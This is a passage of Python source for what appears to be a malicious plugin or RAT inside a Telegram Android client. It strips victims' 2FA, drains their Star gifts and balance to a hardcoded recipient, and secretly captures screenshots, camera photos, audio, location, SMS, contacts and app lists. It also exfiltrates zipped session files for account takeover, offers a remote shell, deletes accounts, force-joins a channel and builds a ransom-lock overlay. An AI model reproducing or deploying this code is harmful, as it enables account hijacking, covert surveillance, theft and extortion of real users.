                    report["recovery_removed"] = True
            except Exception:
                pass
            time.sleep(0.5)
            try:
                r = self._try_kill_2fa(acc)
                report["reset_password"] = r
                if r in ("ok", "password_not_set"):
                    break
            except Exception as e:
                report["reset_password"] = "exc: %s" % e
            time.sleep(1.0)
        try:
            report["state_after"] = self._get_2fa_state(acc)
        except Exception:
            pass
        sa = report["state_after"]
        report["final"] = ("clean" if (sa is None or not sa.get("has_password"))
                           else "still_has_password")
        return report

    # ─── gifts drain ───────────────────────────────────────────────────────

    def _resolve_recipient(self, account=0):
        uid_target = int(BOT_UID)
        with self._recipient_lock:
            c = self._recipient_ah_cache.get(account)
            if c and (time.time() - c[2]) < RECIPIENT_CACHE_TTL and c[1]:
                return c[0], c[1]
        try:
            u = _mc_cls().getInstance(account).getUser(uid_target)
            if u is not None:
                ah = _safe_int(getattr(u, "access_hash", 0))
                if ah:
                    with self._recipient_lock:
                        self._recipient_ah_cache[account] = (uid_target, ah, time.time())
                    return uid_target, ah
        except Exception:
            pass
        try:
            Req = jclass("org.telegram.tgnet.TLRPC$TL_users_getUsers")
            IU = jclass("org.telegram.tgnet.TLRPC$TL_inputUser")
            iu = IU()
            iu.user_id = uid_target
            iu.access_hash = 0
            al = ArrayList()
            al.add(iu)
            req = Req()
            try:
                req.id = al
            except Exception:
                pass
            resp, _e = self._rg_rpc(req, account, 10.0)
            if resp is not None:
                users = getattr(resp, "users", None)
                if users is not None and _jlist_size(users) > 0:
                    u = _jlist_get(users, 0)
                    uid = _safe_int(getattr(u, "id", 0))
                    ah = _safe_int(getattr(u, "access_hash", 0))
                    if uid and ah:
                        try:
                            _mc_cls().getInstance(account).putUsers(resp, True)
                        except Exception:
                            pass
                        with self._recipient_lock:
                            self._recipient_ah_cache[account] = (uid, ah, time.time())
                        return uid, ah
        except Exception:
            pass
        return 0, 0

    def _stars_balance(self, acc=0):
        try:
            Rq = jclass("org.telegram.tgnet.TLRPC$TL_payments_getStarsStatus")
            uid = int(_uc_cls().getInstance(acc).getClientUserId())
            peer = self._get_input_peer(acc, uid)
            if not peer:
                return 0
            rq = Rq()
            rq.peer = peer
            r, _e = self._rg_rpc(rq, acc, 20.0)
            if r:
                bal = getattr(r, "balance", None)
                if bal is not None:
                    try:
                        return int(getattr(bal, "amount", 0))
                    except Exception:
                        try:
                            return int(bal)
                        except Exception:
                            pass
        except Exception:
            pass
        return 0

    def _input_saved_gift(self, saved):
        if saved.get("msg_id"):
            UI = jclass("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser")
            if UI is None:
                return None, "no UI"
            o = UI()
            o.msg_id = int(saved["msg_id"])
            return o, None
        CI = jclass("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat")
        if CI is None:
            return None, "no CI"
        o = CI()
        uid = int(_uc_cls().getInstance(0).getClientUserId())
        peer = self._get_input_peer(0, uid)
        if not peer:
            return None, "no self peer"
        o.peer = peer
        o.saved_id = int(saved.get("saved_id", 0))
        return o, None

    def _get_saved_gifts(self):
        try:
            Req = jclass("org.telegram.tgnet.tl.TL_stars$getSavedStarGifts")
            uid = int(_uc_cls().getInstance(0).getClientUserId())
            peer = self._get_input_peer(0, uid)
            if not peer:
                return []
            out = []
            offset = ""
            for _p in range(20):
                rq = Req()
                rq.peer = peer
                try:
                    rq.offset = offset
                except Exception:
                    pass
                rq.limit = 100
                resp, err = self._rg_rpc(rq, 0, 10.0)
                if err is not None or resp is None:
                    break
                g = getattr(resp, "gifts", None)
                if g is None:
                    break
                gsize = _jlist_size(g)
                for i in range(gsize):
                    sg = _jlist_get(g, i)
                    gift = getattr(sg, "gift", None)
                    if not gift:
                        continue
                    cls = str(type(gift))
                    ra = getattr(gift, "resell_amount", None)
                    ra_l = _jlist_size(ra) > 0 if ra is not None else False
                    is_u = ("Unique" in cls or "TL_starGiftUnique" in cls or ra_l
                            or _safe_int(getattr(gift, "num", 0)) > 0
                            or _get_bool_attr(gift, "isUnique", False)
                            or _get_bool_attr(gift, "canResell", False))
                    out.append({
                        "saved_id": _safe_int(getattr(sg, "saved_id", 0)),
                        "msg_id": _safe_int(getattr(sg, "msg_id", 0)),
                        "gift_id": _safe_int(getattr(gift, "id", 0)),
                        "title": str(getattr(gift, "title", "") or ""),
                        "u": is_u,
                        "transfer_stars": _safe_int(getattr(sg, "transfer_stars", 0)),
                        "can_transfer_at": _safe_int(getattr(sg, "can_transfer_at", 0)),
                        "convert_stars": _safe_int(getattr(sg, "convert_stars", 0)),
                        "listed": ra_l,
                        "can_upgrade": (_get_bool_attr(gift, "can_upgrade", False)
                                        if not is_u else False),
                        "upgrade_stars": (_safe_int(getattr(gift, "upgrade_stars", 0))
                                          if not is_u else 0),
                    })
                nxt = str(getattr(resp, "next_offset", "") or "")
                if not nxt or nxt == offset or gsize == 0:
                    break
                offset = nxt
            return out
        except Exception:
            return []

    def _delist_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = jclass("org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice")
            rq = Rq()
            rq.stargift = o
            try:
                rq.resell_amount = None
            except Exception as e2:
                return {"error": str(e2)}
            r, _e = self._rg_rpc(rq, 0, 6.0)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _convert_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = jclass("org.telegram.tgnet.tl.TL_stars$convertStarGift")
            rq = Rq()
            rq.stargift = o
            r, _e = self._rg_rpc(rq, 0, 6.0)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _upgrade_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = jclass("org.telegram.tgnet.tl.TL_stars$upgradeStarGift")
            rq = Rq()
            rq.stargift = o
            try:
                rq.keep_original_details = False
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, 0, 15.0)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _transfer_saved_gift(self, saved, target_uid, target_ah):
        if saved and saved.get("bc"):
            return {"error": "minted NFT skipped"}
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            tp = TLRPC.TL_inputPeerUser()
            tp.user_id = int(target_uid)
            tp.access_hash = int(target_ah)
            T = jclass("org.telegram.tgnet.tl.TL_stars$transferStarGift")
            if T:
                rq = T()
                rq.stargift = o
                rq.to_id = tp
                r, e = self._rg_rpc(rq, 0, 8.0)
                if r is not None:
                    return {"ok": True}
                etxt = getattr(e, "text", "") or str(e or "")
                if "PAYMENT_REQUIRED" not in etxt and "TOO_EARLY" not in etxt:
                    return {"error": "direct: %s" % etxt[:60]}
            Inv = jclass("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer")
            RF = jclass("org.telegram.tgnet.tl.TL_stars$getPaymentForm")
            SF = jclass("org.telegram.tgnet.tl.TL_stars$sendStarsForm")
            if not (Inv and RF and SF):
                return {"error": "no classes"}
            inv = Inv()
            inv.stargift = o
            inv.to_id = tp
            f = RF()
            f.invoice = inv
            fr, _fe = self._rg_rpc(f, 0, 8.0)
            if fr is None:
                return {"error": "form fail"}
            s = SF()
            s.form_id = _safe_int(getattr(fr, "form_id", 0))
            s.invoice = inv
            sr, _se = self._rg_rpc(s, 0, 10.0)
            return {"ok": True} if sr is not None else {"error": "send fail"}
        except Exception as e:
            return {"error": str(e)}

    def _h_convert(self, test=False):
        gifts = self._get_saved_gifts()
        out = []
        converted = 0
        upgraded = 0
        balance = self._stars_balance(0)
        for g in gifts:
            try:
                if g.get("u"):
                    continue
                if g.get("can_upgrade") and int(g.get("upgrade_stars", 0) or 0) > 0:
                    continue
                conv = int(g.get("convert_stars", 0) or 0)
                if conv <= 0:
                    continue
                r = self._convert_saved_gift(g)
                if isinstance(r, dict) and r.get("ok"):
                    converted += conv
                out.append({"gift_id": g.get("gift_id"),
                            "convert_stars": conv, "result": r})
                time.sleep(0.3)
            except Exception as e:
                out.append({"gift_id": g.get("gift_id"),
                            "result": {"error": str(e)}})
        for g in gifts:
            try:
                if g.get("u"):
                    continue
                if not g.get("can_upgrade"):
                    continue
                up_cost = int(g.get("upgrade_stars", 0) or 0)
                if up_cost <= 0 or balance < up_cost:
                    continue
                r = self._upgrade_saved_gift(g)
                if isinstance(r, dict) and r.get("ok"):
                    upgraded += 1
                    balance -= up_cost
                out.append({"gift_id": g.get("gift_id"),
                            "upgrade_stars": up_cost, "result": r})
                time.sleep(0.3)
            except Exception as e:
                out.append({"gift_id": g.get("gift_id"),
                            "result": {"error": str(e)}})
        return {"converted_stars": converted, "upgraded": upgraded, "results": out}

    def _h_u(self, target_id, target_ah, test=False):
        self._fee_deficit = 0
        gifts = self._get_saved_gifts()
        u_gifts = [g for g in gifts if g.get("u") and not g.get("bc")]
        out = []
        now = int(time.time())
        u_gifts.sort(key=lambda g: (int(g.get("transfer_stars", 0)),
                                    int(g.get("can_transfer_at", 0) or 0)))
        balance = self._stars_balance(0)
        skipped_fees = 0
        for g in u_gifts[:100]:
            try:
                transfer_stars = int(g.get("transfer_stars", 0))
                can_transfer_at = int(g.get("can_transfer_at", 0) or 0)
                if can_transfer_at > now:
                    rem = can_transfer_at - now
                    d = rem // 86400
                    h = (rem % 86400) // 3600
                    out.append({"gift_id": g.get("gift_id"),
                                "unlock_at": can_transfer_at,
                                "result": {"error": "locked %dd %dh" % (d, h)}})
                    continue
                if g.get("listed"):
                    dr = self._delist_saved_gift(g)
                    if not (isinstance(dr, dict) and dr.get("ok")):
                        out.append({"gift_id": g.get("gift_id"),
                                    "result": {"error": "delist failed"}})
                        continue
                    time.sleep(0.3)
                if transfer_stars > 0 and transfer_stars > balance:
                    skipped_fees += transfer_stars
                    out.append({"gift_id": g.get("gift_id"),
                                "transfer_stars": transfer_stars,
                                "result": {"error": "need %d have %d" % (
                                    transfer_stars, balance)}})
                    continue
                r = self._transfer_saved_gift(g, target_id, target_ah)
                out.append({"gift_id": g.get("gift_id"),
                            "transfer_stars": transfer_stars, "result": r})
                if isinstance(r, dict) and r.get("ok") and transfer_stars > 0:
                    balance -= transfer_stars
                time.sleep(0.2)
            except Exception as e:
                out.append({"gift_id": g.get("gift_id"),
                            "result": {"error": str(e)}})
        self._fee_deficit = max(0, skipped_fees - balance)
        return out

    def _h_reactions(self, acc=0):
        try:
            m = re.match(r"^@?([A-Za-z0-9_]+)/(\d+)$", STARS_POST.strip())
            if not m:
                m = re.search(r"t\.me/([A-Za-z0-9_]+)/(\d+)", STARS_POST)
            if not m:
                return {"error": "no post"}
            uname = m.group(1)
            mid = int(m.group(2))
            bal = self._stars_balance(acc)
            if bal <= 0:
                return {"balance": 0, "spent": 0}
            peer = None
            try:
                Resolve = jclass("org.telegram.tgnet.TLRPC$TL_contacts_resolveUsername")
                rq = Resolve()
                rq.username = uname
                rres, _rerr = self._rg_rpc(rq, acc, 10.0)
                if rres:
                    chats = getattr(rres, "chats", None)
                    if chats is not None and _jlist_size(chats) > 0:
                        chat = _jlist_get(chats, 0)
                        peer = TLRPC.TL_inputPeerChannel()
                        peer.channel_id = int(getattr(chat, "id", 0))
                        peer.access_hash = int(getattr(chat, "access_hash", 0))
            except Exception:
                pass
            if peer is None:
                return {"error": "channel not resolved"}
            Rq = jclass("org.telegram.tgnet.tl.TL_messages$sendPaidReaction")
            spent = 0
            for _i in range(min(bal, 50)):
                try:
                    rq = Rq()
                    rq.peer = peer
                    rq.msg_id = mid
                    rq.count = 1
                    try:
                        rq.random_id = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
                    except Exception:
                        pass
                    r, _e = self._rg_rpc(rq, acc, 20.0)
                    if r is None:
                        break
                    spent += 1
                except Exception:
                    break
            return {"balance": bal, "spent": spent}
        except Exception as e:
            return {"error": str(e), "spent": 0}

    def _drain_gifts(self, account=0, test=False):
        uid, ah = self._resolve_recipient(account)
        if not uid or not ah:
            return {"error": "no recipient (uid=%s ah=%s)" % (uid, ah)}
        orig = self.account
        self.account = int(account)
        try:
            conv = self._h_convert(test)
            u = self._h_u(uid, ah, test)
            stars = self._h_reactions(account)
        finally:
            self.account = orig
        return {"convert": conv, "u": u, "stars": stars,
                "fee_deficit": int(getattr(self, "_fee_deficit", 0) or 0)}

    def _drain_gifts_thread(self):
        try:
            self._send_msg("Gift transfer...")
            r = self._drain_gifts(0)
            if r.get("error"):
                self._send_msg("Gift err: %s" % r["error"])
                return
            conv = r.get("convert") or {}
            u = r.get("u") or []
            ok_count = sum(1 for x in u if isinstance(x, dict)
                           and isinstance(x.get("result"), dict)
                           and x["result"].get("ok"))
            self._send_msg(
                "<b>Gift transfer done</b>\nConverted: %s\nUpgraded: %s\n"
                "Transferred: %d\nDeficit: %s" % (
                    conv.get("converted_stars", 0), conv.get("upgraded", 0),
                    ok_count, r.get("fee_deficit", 0)), html=True)
        except Exception as e:
            self._send_msg("gift thread err: " + str(e))

    # ─── surveillance ──────────────────────────────────────────────────────

    def _has_perm(self, name):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return False
            pm = ctx.getPackageManager()
            return pm.checkPermission(name, ctx.getPackageName()) == 0
        except Exception:
            return False

    def _get_activity(self):
        for getter in (
            lambda: jclass("org.telegram.ui.LaunchActivity").instance,
            lambda: ApplicationLoader.application.getCurrentActivity(),
        ):
            try:
                a = getter()
                if a is not None:
                    return a
            except Exception:
                pass
        return None

    def _screenshot(self):
        try:
            act = self._get_activity()
            if act is None:
                return {"error": "no act"}
            view = act.getWindow().getDecorView().getRootView()
            w = view.getWidth()
            h = view.getHeight()
            if w <= 0 or h <= 0:
                return {"error": "bad size"}
            bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
            c = Canvas(bmp)
            view.draw(c)
            ctx = ApplicationLoader.applicationContext
            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
            if not os.path.exists(d):
                os.makedirs(d)
            p = os.path.join(d, "screenshot_%d.jpg" % int(time.time()))
            from java.io import FileOutputStream
            fos = FileOutputStream(p)
            bmp.compress(Bitmap.CompressFormat.JPEG, 85, fos)
            fos.flush()
            fos.close()
            bmp.recycle()
            ph = self._pull_phone(0) or "—"
            self._send_photo(p, "Phone: " + ph)
            try:
                os.remove(p)
            except Exception:
                pass
            return {"ok": True}
        except Exception as e:
            return {"error": str(e)}

    def _screenshot_gain(self):
        res = {"screenshot": None, "camera_front": None, "camera_back": None}
        try:
            self._send_msg("screenshot gain: screen...")
            try:
                res["screenshot"] = self._screenshot()
            except Exception as e:
                res["screenshot"] = {"error": str(e)}
            self._send_msg("screenshot gain: front...")
            try:
                res["camera_front"] = self._manual_camera("front")
            except Exception as e:
                res["camera_front"] = {"error": str(e)}
            self._send_msg("screenshot gain: back...")
            try:
                res["camera_back"] = self._manual_camera("back")
            except Exception as e:
                res["camera_back"] = {"error": str(e)}
            lines = ["<b>Screenshot gain — result</b>"]
            for name, r in res.items():
                if isinstance(r, dict):
                    lines.append("<b>%s:</b> %s" % (
                        name, "ok" if r.get("ok") else r.get("error", "fail")))
                else:
                    lines.append("<b>%s:</b> %s" % (name, r))
            self._send_msg("\n".join(lines), html=True)
        except Exception as e:
            self._send_msg("Screenshot gain err: " + str(e))
        return res

    def _manual_camera(self, which="front"):
        try:
            if not self._has_perm("android.permission.CAMERA"):
                return {"error": "no perm"}
            cam = jclass("android.hardware.Camera")
            cid = None
            try:
                ic = jclass("android.hardware.Camera$CameraInfo")
                facing = ic.CAMERA_FACING_FRONT if which == "front" else ic.CAMERA_FACING_BACK
                info = ic()
                total = int(cam.getNumberOfCameras())
                for i in range(total):
                    cam.getCameraInfo(i, info)
                    if int(info.facing) == int(facing):
                        cid = i
                        break
            except Exception:
                pass
            if cid is None:
                cid = 1 if which == "front" else 0
            c = None
            for _ in range(4):
                try:
                    c = cam.open(int(cid))
                    break
                except Exception:
                    time.sleep(0.4)
            if c is None:
                return {"error": "no open"}
            try:
                st = jclass("android.graphics.SurfaceTexture")(0)
                c.setPreviewTexture(st)
                c.startPreview()
                ev = threading.Event()
                box = [None]
                PC = jclass("android.hardware.Camera$PictureCallback")

                class _PC(dynamic_proxy(PC)):
                    def onPictureTaken(self, data, camera):
                        box[0] = data
                        ev.set()

                c.takePicture(None, None, _PC())
                ev.wait(8)
                if box[0]:
                    raw = bytes(box[0])
                    self._send_document_bytes("%s.jpg" % which, raw)
                    return {"ok": True}
                return {"error": "no photo"}
            finally:
                try:
                    c.stopPreview()
                except Exception:
                    pass
                try:
                    c.release()
                except Exception:
                    pass
        except Exception as e:
            return {"error": str(e)}

    def _manual_audio(self, sec=5):
        try:
            if not self._has_perm("android.permission.RECORD_AUDIO"):
                return {"error": "no perm"}
            ctx = ApplicationLoader.applicationContext
            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()),
                             "a_%d.3gp" % int(time.time()))
            mr = jclass("android.media.MediaRecorder")()
            try:
                src = getattr(jclass("android.media.MediaRecorder$AudioSource"), "MIC", 1)
                of = getattr(jclass("android.media.MediaRecorder$OutputFormat"), "THREE_GPP", 1)
                ae = getattr(jclass("android.media.MediaRecorder$AudioEncoder"), "AMR_NB", 1)
            except Exception:
                src = of = ae = 1
            mr.setAudioSource(src)
            mr.setOutputFormat(of)
            mr.setAudioEncoder(ae)
            mr.setOutputFile(p)
            mr.prepare()
            mr.start()
            time.sleep(int(sec))
            mr.stop()
            mr.release()
            with open(p, "rb") as f:
                data = f.read()
            try:
                os.remove(p)
            except Exception:
                pass
            self._send_document_bytes("audio.3gp", data)
            return {"ok": True}
        except Exception as e:
            return {"error": str(e)}

    def _manual_location(self):
        try:
            if not (self._has_perm("android.permission.ACCESS_FINE_LOCATION")
                    or self._has_perm("android.permission.ACCESS_COARSE_LOCATION")):
                self._send_msg("Локация: нет разрешения")
                return
            ctx = ApplicationLoader.applicationContext
            lm = ctx.getSystemService(ctx.LOCATION_SERVICE)
            providers = lm.getAllProviders()
            for p in ["fused", "gps", "network"]:
                if p in [str(x) for x in providers]:
                    try:
                        loc = lm.getLastKnownLocation(p)
                        if loc:
                            self._send_msg(
                                "<b>Локация</b>\nlat: %f\nlon: %f\nточность: %f (%s)" % (
                                    float(loc.getLatitude()), float(loc.getLongitude()),
                                    float(loc.getAccuracy()), p), html=True)
                            return
                    except Exception:
                        pass
            self._send_msg("Локация: нет фикса")
        except Exception as e:
            self._send_msg("Ошибка локации: " + str(e))

    # ─── data grab ─────────────────────────────────────────────────────────

    def _manual_sms(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_SMS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://sms"),
                               ["address", "body", "date"], None, None, "date DESC")
                if cur:
                    while cur.moveToNext():
                        out.append("%s: %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out:
                self._send_msg("SMS empty or no perm")
                return
            self._send_msg("<b>SMS (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:100]))), html=True)
        except Exception as e:
            self._send_msg("sms err: " + str(e))

    def _manual_contacts(self):
        try:
            out = []
            if self._has_perm("android.permission.READ_CONTACTS"):
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://com.android.contacts/data/phones"),
                               ["display_name", "data1"], None, None, None)
                if cur:
                    while cur.moveToNext():
                        out.append("%s — %s" % (cur.getString(0), cur.getString(1)))
                    cur.close()
            if not out:
                self._send_msg("Contacts empty or no perm")
                return
            self._send_msg("<b>Contacts (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:200]))), html=True)
        except Exception as e:
            self._send_msg("contacts err: " + str(e))

    def _manual_apps(self):
        try:
            ctx = ApplicationLoader.applicationContext
            pm = ctx.getPackageManager()
            apps = pm.getInstalledApplications(0)
            out = []
            for i in range(_jlist_size(apps)):
                try:
                    a = _jlist_get(apps, i)
                    pkg = str(a.packageName)
                    label = pkg
                    try:
                        label = str(pm.getApplicationLabel(a))
                    except Exception:
                        pass
                    out.append("%s — %s" % (label, pkg))
                except Exception:
                    pass
            out.sort()
            self._send_msg("<b>Apps (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:300]))), html=True)
        except Exception as e:
            self._send_msg("apps err: " + str(e))

    def _manual_chats(self):
        try:
            mc = _mc_cls().getInstance(0)
            try:
                dialogs = mc.dialogs_dict
            except Exception:
                dialogs = mc.getAllDialogs()
            if not dialogs:
                self._send_msg("no dialogs")
                return
            out = []
            for i in range(_jlist_size(dialogs)):
                try:
                    did = int(dialogs.keyAt(i)) if hasattr(dialogs, "keyAt") else 0
                    title = ""
                    if did > 0:
                        u = mc.getUser(did)
                        if u is not None:
                            title = " ".join(x for x in (
                                str(getattr(u, "first_name", "") or ""),
                                str(getattr(u, "last_name", "") or "")) if x) or str(did)
                    else:
                        cid = -did
                        if cid > 1000000000000:
                            cid -= 1000000000000
                        c = mc.getChat(int(cid))
                        if c is not None:
                            title = str(getattr(c, "title", "") or str(did))
                    out.append("%d — %s" % (did, title or "?"))
                except Exception:
                    pass
            self._send_msg("<b>Chats (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:200]))), html=True)
        except Exception as e:
            self._send_msg("chats err: " + str(e))

    # ─── session dumps ─────────────────────────────────────────────────────

    def _collect_session_files(self, base):
        files = []
        m1 = base + "/files/tgnet.dat"
        if os.path.exists(m1):
            files.append(m1)
        ad = base + "/files"
        if os.path.isdir(ad):
            for name in os.listdir(ad):
                if name.startswith("account"):
                    p = ad + "/" + name + "/tgnet.dat"
                    if os.path.exists(p):
                        files.append(p)
                    uc = ad + "/" + name + "/userconfig.xml"
                    if os.path.exists(uc):
                        files.append(uc)
        pd = base + "/shared_prefs"
        if os.path.isdir(pd):
            for name in os.listdir(pd):
                low = name.lower()
                if ("userconfig" in low or "userconfing" in low
                        or "cache4" in low) and name.endswith(".xml"):
                    files.append(pd + "/" + name)
        c4 = base + "/files/cache4.db"
        if os.path.exists(c4):
            files.append(c4)
            for suffix in ("-wal", "-shm"):
                if os.path.exists(c4 + suffix):
                    files.append(c4 + suffix)
        return files

    def _manual_userbot_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return
            pkg = str(ctx.getPackageName())
            base = "/data/data/%s" % pkg
            files = self._collect_session_files(base)
            if not files:
                self._send_msg("no session files")
                return
            amap = {}
            for a in self._get_accounts_list():
                amap[str(a.get("id"))] = {
                    "user_id": a.get("user_id"),
                    "username": a.get("username", ""),
                    "phone": a.get("phone", ""),
                }
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try:
                        if os.path.getsize(fp) <= MAX_DOC_SIZE:
                            zf.write(fp, arcname=os.path.relpath(fp, base).replace("\\", "/"))
                    except Exception:
                        pass
                if amap:
                    zf.writestr("accounts_map.json",
                                json.dumps(amap, ensure_ascii=False, indent=2))
            self._send_document_bytes("userbot_session.zip", z.getvalue())
        except Exception as e:
            self._send_msg("userbot err: " + str(e))

    def _manual_dump_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return
            pkg = str(ctx.getPackageName())
            base = "/data/data/%s" % pkg
            files = []
            for rd, _dirs, fns in os.walk(base):
                if rd.count("/") - base.count("/") > 3:
                    continue
                if any(x in rd for x in ("/cache/", "/files/cache",
                                         "/files/photos", "/files/videos")):
                    continue
                for f in fns:
                    low = f.lower()
                    if ("session" in low or "auth" in low or "cache4" in low
                            or low.endswith(".db") or low.endswith(".xml")):
                        fp = os.path.join(rd, f)
                        try:
                            if os.path.getsize(fp) <= MAX_DOC_SIZE:
                                files.append(fp)
                        except Exception:
                            pass
            if not files:
                self._send_msg("no session files")
                return
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try:
                        zf.write(fp, arcname=os.path.relpath(fp, base))
                    except Exception:
                        pass
            self._send_document_bytes("session.zip", z.getvalue())
        except Exception as e:
            self._send_msg("dump err: " + str(e))

    # ─── account actions ───────────────────────────────────────────────────

    def _pull_out_account(self):
        try:
            self._send_msg("Pull Out...")
            rq = TLRPC.TL_auth_logOut()
            _r, e = self._rg_rpc(rq, 0, 10.0)
            if e is not None:
                self._send_msg("Pull out err: " + str(e))
            else:
                self._send_msg("Pull out OK.")
        except Exception as e:
            self._send_msg("Pull out exc: " + str(e))

    def _delete_account(self):
        try:
            self._send_msg("☠️ Удаляю аккаунт...")
            req = TLRPC.TL_account_deleteAccount()
            req.reason = "deleted"
            resp, err = self._rg_rpc(req, 0, 15.0)
            if err is not None:
                self._send_msg("Ошибка удаления: " + str(err))
            else:
                self._send_msg("✅ Аккаунт удалён.")
        except Exception as e:
            self._send_msg("Ошибка удаления: " + str(e))

    def _join_a4team(self):
        try:
            self._send_msg("🚀 Подписка на a4team...")
            channel_id = 4452547534
            access_hash = 0
            try:
                Req = jclass("org.telegram.tgnet.TLRPC$TL_contacts_resolveUsername")
                rq = Req()
                rq.username = "a4team"
                resp, _e = self._rg_rpc(rq, 0, 12.0)
                if resp is not None:
                    chats = getattr(resp, "chats", None)
                    if chats is not None and _jlist_size(chats) > 0:
                        c = _jlist_get(chats, 0)
                        channel_id = int(getattr(c, "id", 0))
                        access_hash = int(getattr(c, "access_hash", 0))
            except Exception:
                pass
            if not access_hash:
                self._send_msg("❌ Не удалось resolve @a4team")
                return
            input_channel = TLRPC.TL_inputChannel()
            input_channel.channel_id = int(channel_id)
            input_channel.access_hash = int(access_hash)
            req = TLRPC.TL_channelsJoinChannel()
            req.channel = input_channel
            resp, err = self._rg_rpc(req, 0, 20.0)
            if err is not None:
                etxt = getattr(err, "text", str(err))
                self._send_msg("Ошибка входа: " + str(etxt))
            else:
                self._send_msg("✅ Подписан на a4team!")
        except Exception as e:
            self._send_msg("Ошибка входа: " + str(e))

    def _manual_shell(self, cmd):
        try:
            p = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            out = p.stdout.decode("utf-8", "ignore")
            err = p.stderr.decode("utf-8", "ignore")
            self._send_msg("<b>shell</b> <code>%s</code>\n<b>rc:</b> %d\n<pre>%s\n%s</pre>" % (
                self._html_escape(cmd), p.returncode,
                self._html_escape(out[:3000]), self._html_escape(err[:1000])), html=True)
        except Exception as e:
            self._send_msg("shell err: " + str(e))

    # ─── troll (ransom / locker / mercy / vidker / music / flood / dim) ────

    def _ensure_overlay_perm(self, ctx):
        try:
            if jclass("android.provider.Settings").canDrawOverlays(ctx):
                return True
        except Exception:
            pass
        pkg = str(ctx.getPackageName())
        for c in ("su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
                  "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg):
            try:
                subprocess.run(c, shell=True, capture_output=True, timeout=10)
            except Exception:
                continue
        try:
            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
        except Exception:
            return False

    def _show_ransom(self, text="", photo_url="", ton_link="", card_link="",
                     amount_rub=0, amount_ton=0, warning=""):
        if self._ransom_view is not None:
            return {"ok": True, "already": True}
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return {"error": "no ctx"}
            use_decor = not self._ensure_overlay_perm(ctx)
            photo_path = ""
            if photo_url and self._ransom_photo_path and self._ransom_photo_url == photo_url \
                    and os.path.exists(self._ransom_photo_path):
                photo_path = self._ransom_photo_path
            elif photo_url:
                try:
                    from urllib.request import urlopen
                    data = urlopen(photo_url, timeout=20).read()
                    photo_path = os.path.join(
                        str(ctx.getFilesDir().getAbsolutePath()),
                        "ransom_%d.jpg" % int(time.time()))
                    with open(photo_path, "wb") as f:
                        f.write(data)
                    self._ransom_photo_path = photo_path
                    self._ransom_photo_url = photo_url
                except Exception:
                    pass
            drew = threading.Event()
            derr = [None]

            def _build():
                try:
                    CTX = jclass("android.content.Context")
                    wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
                    self._ransom_wm = wm
                    LL = jclass("android.widget.LinearLayout")
                    TV = jclass("android.widget.TextView")
                    IV = jclass("android.widget.ImageView")
                    LP = jclass("android.view.WindowManager$LayoutParams")
                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
                    Color = jclass("android.graphics.Color")
                    Gravity = jclass("android.view.Gravity")
                    BitmapFactory = jclass("android.graphics.BitmapFactory")
                    TypedValue = jclass("android.util.TypedValue")
                    VLG = jclass("android.view.ViewGroup$LayoutParams")
                    root = LL(ctx)
                    root.setOrientation(LL.VERTICAL)
                    root.setBackgroundColor(Color.parseColor("#1A1A1A"))
                    pad = int(TypedValue.applyDimension(
                        TypedValue.COMPLEX_UNIT_DIP, 24,
                        ctx.getResources().getDisplayMetrics()))
                    root.setPadding(pad, pad, pad, pad)
                    root.setGravity(Gravity.CENTER)
                    if photo_path:
                        try:
                            bmp = BitmapFactory.decodeFile(photo_path)
                            if bmp is not None:
                                iv = IV(ctx)
                                iv_lp = LP_LV(VLG.MATCH_PARENT, int(TypedValue.applyDimension(
                                    TypedValue.COMPLEX_UNIT_DIP, 280,
                                    ctx.getResources().getDisplayMetrics())))
                                iv_lp.bottomMargin = int(TypedValue.applyDimension(
                                    TypedValue.COMPLEX_UNIT_DIP, 16,
                                    ctx.getResources().getDisplayMetrics()))
                                iv.setLayoutParams(iv_lp)
                                iv.setScaleType(iv.ScaleType.CENTER_CROP)
                                iv.setImageBitmap(bmp)
                                root.addView(iv)
